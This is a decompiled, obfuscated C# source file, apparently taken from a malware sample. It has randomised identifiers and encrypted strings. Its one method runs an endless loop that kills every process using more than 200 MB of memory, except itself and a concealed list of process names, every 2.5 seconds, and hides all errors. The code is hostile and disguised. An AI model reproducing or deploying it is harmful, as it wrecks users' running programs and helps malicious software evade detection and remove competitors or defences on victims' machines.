using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace InTDhhOfzy;

public static class XqLcUEhPipWd
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void yKOTwBxYlSaOKU()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107407375)) && !process.ProcessName.Contains(getString_0(107407366)) && !process.ProcessName.Contains(getString_0(107407389)) && !process.ProcessName.Contains(getString_0(107407380)) && !process.ProcessName.Contains(getString_0(107407335)) && !process.ProcessName.Contains(getString_0(107407354)) && !process.ProcessName.Contains(getString_0(107407309)) && !process.ProcessName.Contains(getString_0(107407328)) && !process.ProcessName.Contains(getString_0(107407315)) && !process.ProcessName.Contains(getString_0(107407270)) && !process.ProcessName.Contains(getString_0(107406737)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static XqLcUEhPipWd()
	{
		Strings.CreateGetStringDelegate(typeof(XqLcUEhPipWd));
	}
}
